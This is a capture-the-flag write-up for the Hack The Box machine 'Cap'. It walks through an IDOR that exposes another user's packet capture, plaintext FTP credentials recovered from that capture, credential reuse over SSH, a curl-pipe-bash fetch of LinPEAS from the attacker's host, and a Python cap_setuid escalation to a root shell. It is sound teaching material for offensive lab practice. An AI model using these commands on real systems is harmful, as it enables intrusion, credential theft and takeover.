---
description: Full attack path for the HTB machine Cap.
---

# Cap

Use this page to track the full attack path for `Cap`.

### Target

* OS: `Linux`
* Difficulty: `Easy`
* IP: `10.10.10.245`
* User: `nathan`
* Vulnerabilities: `IDOR`, `Linux capabilities`

### Enumeration

#### Network enumeration

```bash
# Full TCP scan
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

# Service and script scan
nmap -p$ports -Pn -sC -sV 10.10.10.245
```

**Findings**

* `21/tcp` runs FTP with `vsftpd 3.0.3`
* `22/tcp` runs SSH with `OpenSSH 8.2p1`
* `80/tcp` serves a Python app through `gunicorn`

#### FTP enumeration

```bash
ftp 10.10.10.245
# Name: anonymous
# Password: <empty>
```

**Findings**

* Anonymous FTP login fails
* HTTP is the best next target

#### Web enumeration

Browse to `http://10.10.10.245`.

The site exposes a security dashboard for user `Nathan`.

Key pages:

* **Dashboard** shows security events and failed logins
* **Security Snapshot** creates a short packet capture
* **IP Config** runs `ifconfig`
* **Network Status** runs `netstat`

**Findings**

* The app executes system commands on the server
* Snapshot downloads use `/data/<id>`
* The numeric ID increments for each capture

### Foothold

#### Exploit the IDOR

The `/data/<id>` path has no access control.

Test an earlier capture:

```bash
curl -O http://10.10.10.245/data/0
```

**Findings**

* `0.pcap` contains more traffic than the capture we created
* The file belongs to another user
* This is an insecure direct object reference

#### Recover credentials from the packet capture

Open the capture:

```bash
wireshark 0.pcap
```

Filter for:

```
ftp
```

**Findings**

* Username: `nathan`
* Password: `Buck3tH4TF0RM3!`

FTP sends credentials in plaintext, so the packet capture exposes them directly.

#### Reuse the credentials over SSH

```bash
ssh nathan@10.10.10.245
```

The same credentials work for SSH.

### User flag

```bash
cd /home/nathan
cat user.txt
```

### Privilege escalation

#### Run LinPEAS

Host the script locally:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80
```

Pull and run it on the target:

```bash
curl http://10.10.14.100/linpeas.sh | bash
```

#### Abuse Python capabilities

LinPEAS reports:

```
Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` lets Python switch to UID `0` without a SUID binary.

Start Python:

```bash
/usr/bin/python3.8
```

Escalate to root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

This drops you into a root shell.

### Root flag

```bash
cat /root/root.txt
```

### Takeaways

* Test sequential object IDs for IDOR early
* Read packet captures carefully when a web app stores them
* Reuse credentials across FTP, SSH, and web logins
* Run privilege escalation checks soon after foothold
* `cap_setuid` on Python gives direct root access
